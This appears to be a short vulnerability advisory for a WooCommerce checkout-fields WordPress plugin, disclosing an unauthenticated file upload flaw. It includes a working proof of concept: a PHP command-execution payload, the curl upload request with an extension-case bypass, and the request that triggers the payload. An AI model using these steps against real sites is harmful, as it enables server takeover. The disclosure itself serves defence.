## WordPress Plugin Vulnerabilities

# WooCommerce Checkout Field Manager < 18.0 - Unauthenticated Arbitrary File Upload

### Description

The plugin does not validate files to be uploaded, which could allow unauthenticated attackers to upload arbitrary files such as PHP on the server

### Proof of Concept

1. Install and activate woocommerce (dependency, no setup required)
2. Install and active the vulnerable plugin (n-media-woocommerce-checkout-fields 17.2)
3. Prepare the payload:
echo '<?php passthru("id"); ?>' > /tmp/payload.php
4. Invoke the following curl command to upload the payload (notice the name parameter is set to ".pHp"):
curl -i 'http://127.0.0.1:7777/wp-admin/admin-ajax.php?action=cfom\_upload\_file&name=payload.pHp' \
-F 'file=@/tmp/payload.php'
5. Trigger the payload:
curl -i 'http://127.0.0.1:7777/wp-content/uploads/cfom\_files/payload.php'
